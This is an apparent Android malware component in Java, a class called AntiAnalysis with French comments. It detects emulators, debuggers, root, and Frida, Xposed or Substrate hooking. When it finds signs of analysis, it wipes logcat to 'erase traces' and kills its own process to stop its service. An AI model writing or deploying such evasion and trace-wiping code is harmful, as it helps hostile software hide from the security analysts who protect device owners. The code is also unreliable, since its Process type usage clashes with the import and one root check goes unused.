// AntiAnalysis.java
package com.ghost.core.utils;

import android.app.ActivityManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Debug;
import android.os.Process;
import android.telephony.TelephonyManager;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.List;

public class AntiAnalysis {
    
    private Context context;
    private NativeLib nativeLib;
    
    public AntiAnalysis(Context context) {
        this.context = context;
        this.nativeLib = new NativeLib();
    }
    
    /**
     * Vérifie si on est dans un émulateur
     */
    public boolean isEmulator() {
        // Vérification native
        if (nativeLib.isEmulator()) {
            return true;
        }
        
        // Propriétés de l'émulateur
        if (Build.FINGERPRINT.startsWith("generic") ||
            Build.FINGERPRINT.startsWith("unknown") ||
            Build.MODEL.contains("google_sdk") ||
            Build.MODEL.contains("Emulator") ||
            Build.MODEL.contains("Android SDK built for x86") ||
            Build.MANUFACTURER.contains("Genymotion") ||
            Build.HARDWARE.contains("goldfish") ||
            Build.HARDWARE.contains("ranchu") ||
            Build.PRODUCT.contains("sdk") ||
            Build.PRODUCT.contains("vbox86p") ||
            Build.PRODUCT.contains("emulator")) {
            return true;
        }
        
        // Téléphonie
        try {
            TelephonyManager tm = (TelephonyManager) 
                context.getSystemService(Context.TELEPHONY_SERVICE);
            String operator = tm.getNetworkOperatorName();
            if (operator != null && operator.toLowerCase().contains("android")) {
                return true;
            }
        } catch (Exception e) {
            // Ignorer
        }
        
        return false;
    }
    
    /**
     * Vérifie si on est en mode débogage
     */
    public boolean isDebugged() {
        // Vérification native
        if (nativeLib.checkDebug()) {
            return true;
        }
        
        // Vérifier les flags de débogage
        if ((context.getApplicationInfo().flags & 
             android.content.pm.ApplicationInfo.FLAG_DEBUGGABLE) != 0) {
            return true;
        }
        
        // Vérifier si un débogueur est attaché
        if (Debug.isDebuggerConnected() || Debug.waitingForDebugger()) {
            return true;
        }
        
        // Vérifier les threads
        try {
            Thread[] threads = new Thread[100];
            int count = Thread.enumerate(threads);
            for (int i = 0; i < count; i++) {
                if (threads[i].getName().contains("jdwp") ||
                    threads[i].getName().contains("debug")) {
                    return true;
                }
            }
        } catch (Exception e) {
            // Ignorer
        }
        
        return false;
    }
    
    /**
     * Vérifie si l'application est exécutée dans un environnement rooté
     */
    public boolean isRooted() {
        // Chemins des binaires root
        String[] paths = {
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su",
            "/data/local/su",
            "/su/bin/su"
        };
        
        for (String path : paths) {
            if (new File(path).exists()) {
                return true;
            }
        }
        
        // Vérifier les commandes
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"/system/xbin/which", "su"});
            BufferedReader in = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            if (in.readLine() != null) {
                return true;
            }
        } catch (Exception e) {
            // Ignorer
        }
        
        return false;
    }
    
    /**
     * Vérifie si on est dans un environnement d'analyse (Xposed, Frida, etc.)
     */
    public boolean isAnalyzed() {
        try {
            // Vérifier Xposed
            Class.forName("de.robv.android.xposed.XposedHelpers");
            return true;
        } catch (ClassNotFoundException e) {
            // Pas de Xposed
        }
        
        try {
            // Vérifier Frida
            Class.forName("frida.Frida");
            return true;
        } catch (ClassNotFoundException e) {
            // Pas de Frida
        }
        
        try {
            // Vérifier Substrate
            Class.forName("com.saurik.substrate.MS");
            return true;
        } catch (ClassNotFoundException e) {
            // Pas de Substrate
        }
        
        // Vérifier les processus suspects
        ActivityManager am = (ActivityManager) 
            context.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> processes = 
            am.getRunningAppProcesses();
        
        if (processes != null) {
            for (ActivityManager.RunningAppProcessInfo proc : processes) {
                if (proc.processName.contains("frida") ||
                    proc.processName.contains("xposed") ||
                    proc.processName.contains("substrate")) {
                    return true;
                }
            }
        }
        
        return false;
    }
    
    /**
     * Lance les vérifications et arrête le service si nécessaire
     */
    public boolean shouldStop() {
        if (isEmulator() || isDebugged() || isAnalyzed()) {
            // Effacer les traces
            clearTraces();
            return true;
        }
        return false;
    }
    
    /**
     * Efface les traces de l'application
     */
    private void clearTraces() {
        try {
            // Effacer les logs
            Process process = Runtime.getRuntime().exec("logcat -c");
            process.waitFor();
        } catch (Exception e) {
            // Ignorer
        }
        
        // S'arrêter
        Process.killProcess(Process.myPid());
    }
}
